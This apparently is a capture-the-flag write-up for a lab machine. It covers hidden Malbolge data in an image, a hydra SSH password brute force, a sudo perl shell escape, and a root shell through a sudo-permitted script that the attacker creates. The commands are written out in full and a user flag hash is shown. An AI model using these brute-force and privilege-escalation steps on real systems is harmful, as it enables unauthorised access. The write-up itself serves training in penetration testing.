🟢 Executive Summary
Severity: High
Description:
Initial access was gained by downloading a .jpg file from the web server, which contained hidden, encoded information in the Malbolge esoteric language. After decoding, the username missyred was discovered. SSH access was obtained by brute-forcing the password using hydra and the rockyou.txt wordlist. Privilege escalation was achieved first by abusing sudo permissions to escalate from missyred to kings using perl, and finally to root by exploiting a misconfigured script (/opt/boom/boom.sh) that could be executed as root without a password.

4.4 SSH Brute Force

hydra -l missyred -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.135 -t 64 -I

4.5 Privilege Escalation – User missyred → kings

sudo -l
Output:

User missyred may run the following command as kings:
    (kings) /usr/bin/perl
Exploit:

sudo -u kings perl -e 'exec "/bin/bash";'
Confirmed:

whoami
# kings
📝 Flag obtained:
user.txt → f4e690f638c01bd8a19fb1349d40519c

4.6 Privilege Escalation – User kings → root
sudo -l
Output:

User kings may run the following command as root:
    (ALL) NOPASSWD: /opt/boom/boom.sh
Directory didn’t exist, so it was manually created:

mkdir /opt/boom
nano /opt/boom/boom.sh
boom.sh contents:

#!/bin/bash
/bin/bash
Make it executable:

chmod +x /opt/boom/boom.sh
Run it as root:

sudo /opt/boom/boom.sh
Confirmed:

whoami
# root
📝 Flag obtained:
